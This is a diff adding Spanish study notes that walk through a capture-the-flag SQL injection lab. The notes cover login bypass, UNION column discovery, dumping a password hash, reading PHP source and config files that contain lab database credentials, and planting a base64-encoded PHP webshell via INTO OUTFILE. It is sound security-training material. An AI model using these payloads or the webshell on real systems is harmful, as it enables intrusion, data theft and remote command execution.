@@ -51,3 +51,259 @@ SELECT COUNT(*) AS num_records FROM titles WHERE emp_no > 10000 OR title NOT LIK
 
 ## SQL Injections
 
+<figure><img src="../.gitbook/assets/types_of_sqli.jpg" alt=""><figcaption></figcaption></figure>
+
+### Subverting Query Logic
+
+| `'` | `%27` |
+| --- | ----- |
+| `"` | `%22` |
+| `#` | `%23` |
+| `;` | `%3B` |
+| `)` | `%29` |
+
+#### Preguntas
+
+**Try to log in as the user 'tom'. What is the flag value shown after you successfully log in?**
+
+<figure><img src="../.gitbook/assets/image (1697).png" alt=""><figcaption></figcaption></figure>
+
+### Using Comments
+
+#### Preguntas
+
+**Login as the user with the id 5 to get the flag.**
+
+<figure><img src="../.gitbook/assets/image (1698).png" alt=""><figcaption></figcaption></figure>
+
+### Union clauses
+
+#### Preguntas
+
+**Connect to the above MySQL server with the 'mysql' tool, and find the number of records returned when doing a 'Union' of all records in the 'employees' table and all records in the 'departments' table.**
+
+```
+show DATABASES;
+use employees;
+describe employees;
+describe departments;
+SELECT COUNT(*) AS employees_count FROM employees; -> nos devuelve 554
+SELECT COUNT(*) AS departments_count FROM departments; -> nos devuelve 9
+#Lo sumamos
+SELECT (SELECT COUNT(*) FROM employees) + (SELECT COUNT(*) FROM departments) AS expected_sum;
+```
+
+<figure><img src="../.gitbook/assets/image (1699).png" alt=""><figcaption></figcaption></figure>
+
+### Union Injection
+
+#### Preguntas
+
+**Use a Union injection to get the result of 'user()'**
+
+Primero vemos cuántas columnas son.
+
+```
+' UNION select 1,2,3,4-- -
+```
+
+Ahora hacemos que nos imprima en una columna el resultado.
+
+```
+' UNION SELECT 1, user(), 3, 4-- -
+```
+
+<figure><img src="../.gitbook/assets/image (1700).png" alt=""><figcaption></figcaption></figure>
+
+## Exploitation
+
+### Database Enumeration
+
+#### Preguntas
+
+**What is the password hash for 'newuser' stored in the 'users' table in the 'ilfreight' database?**
+
+Primero vemos cuántas columnas.
+
+```
+' UNION select 1,2,3,4-- -
+```
+
+Como ya sabes que la consulta tiene **4 columnas** y la página imprime las **columnas 2, 3 y 4**, usamos este UNION.
+
+```
+cn' UNION SELECT 1, username, password, 4
+FROM ilfreight.users
+WHERE username='newuser'-- -
+```
+
+<figure><img src="../.gitbook/assets/image (1701).png" alt=""><figcaption></figcaption></figure>
+
+### Reading Files
+
+#### Preguntas
+
+**We see in the above PHP code that '$conn' is not defined, so it must be imported using the PHP include command. Check the imported page to obtain the database password.**
+
+Primero vemos cuántas columnas.
+
+```
+' UNION select 1,2,3,4-- -
+```
+
+Como ya sabes que la consulta tiene **4 columnas** y la página imprime las **columnas 2, 3 y 4**, usamos esto.
+
+```
+' UNION SELECT 1, TO_BASE64(LOAD_FILE('/var/www/html/search.php')), 3, 4-- -
+```
+
+<figure><img src="../.gitbook/assets/image (1702).png" alt=""><figcaption></figcaption></figure>
+
+Al decodificarlo en base64 sale el siguiente código.
+
+```
+<?php
+include "config.php";
+?>
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>Search Ports</title>
+
+    <link href="./style.css" rel="stylesheet">
+	</head>
+
+  <body>
+  <div class="container-narrow" style="width:820px">
+		
+		
+		<div class="response" style="background-color: #28ACE2; width:820px"> 
+		
+			<p style="color:white">
+			<table class="response" style="background-color: #28ACE2">
+			<form method="GET" autocomplete="off">
+			
+			<tr>
+				<td>
+					Search for a port:  
+				</td>
+				<td>
+					<input type="text" id="port_code" name="port_code">&nbsp;&nbsp;
+				</td>
+				<td>
+					<input type="submit" value="Search"/> 
+				</td>
+			</tr>
+	</table>
+				
+			</p>
+
+		</form>
+        </div>
+    
+        
+		<br />
+<div class="searchheader" style="color:white;background-color: white">
+<table class="tabl pure-table">	
+<thead>
+    
+	<tr class="rowz"> 
+    <td style="width:500px" colspan=3 >
+        <b>Port Code</b>
+    </td>
+    
+    <td style="width:500px" colspan=3 >
+        <b>Port City</b>
+    </td>
+    
+    <td style="width:500px" colspan=3>
+        <b>Port Volume</b>
+    </td>
+ 
+</tr>
+</thead>
+<tbody>
+
+<?php
+if (isset($_GET["port_code"])) {
+$q = "Select * from ports where code like '%".$_GET["port_code"]."%'";
+
+$result = mysqli_query($conn,$q);
+if (!$result)
+{
+		die("</table></div><p style='font-size: 15px'>".mysqli_error($conn)."</p>");
+}
+while($row = mysqli_fetch_array($result))
+  {
+  echo "<tr><td style=\"width:400px\" colspan=3>".$row[1]."</td><td style=\"width:400px\" colspan=3>".$row[2]."</td><td style=\"width:450px\" colspan=3>".$row[3]."</tr>";
+  }
+}
+?>
+</tbody>
+</table>
+	</div>
+
+	  
+	  
+	  
+	</div> <!-- /container -->
+  
+</body>
+</html>
+<style>
+</style>
+```
+
+Vamos a leer **/var/www/html/config.php** con `LOAD_FILE()` vía UNION y, para que no se renderice HTML/PHP raro, lo envolvemos en **Base64**.
+
+```
+' UNION SELECT 1, TO_BASE64(LOAD_FILE('/var/www/html/config.php')), 3, 4-- -
+```
+
+<figure><img src="../.gitbook/assets/image (1703).png" alt=""><figcaption></figcaption></figure>
+
+Ahora lo decodificamos y nos sale lo siguiente.
+
+```
+<?php
+
+$config=array(
+'DB_HOST'=>'localhost',
+'DB_USERNAME'=>'root',
+'DB_PASSWORD'=>'dB_pAssw0rd_iS_flag!',
+'DB_DATABASE'=>'ilfreight'
+);
+
+$conn = mysqli_connect($config['DB_HOST'], $config['DB_USERNAME'], $config['DB_PASSWORD'], $config['DB_DATABASE']);
+
+if (mysqli_connect_errno($conn))
+  {
+  	echo "Failed connecting. " . mysqli_connect_error() . "<br/>";
+  }
+
+?>
+```
+
+### Writing Files
+
+#### Preguntas
+
+**Find the flag by using a webshell.**
+
+Primero subimos la webshell en Base64.
+
+```
+' UNION SELECT "", FROM_BASE64('PD9waHAgc3lzdGVtKCRfR0VUWzBdKTsgPz4='), "", "" INTO OUTFILE '/var/www/html/shell.php'-- -
+```
+
+<figure><img src="../.gitbook/assets/image (1704).png" alt=""><figcaption></figcaption></figure>
+
+Buscamos en el navegador.
+
+<figure><img src="../.gitbook/assets/image (1705).png" alt=""><figcaption></figcaption></figure>
+
+Buscamos entonces dónde se encuentra la flag.
+
+<figure><img src="../.gitbook/assets/image (1706).png" alt=""><figcaption></figcaption></figure>
+
+Mostramos contenido.
+
+<figure><img src="../.gitbook/assets/image (1707).png" alt=""><figcaption></figcaption></figure>
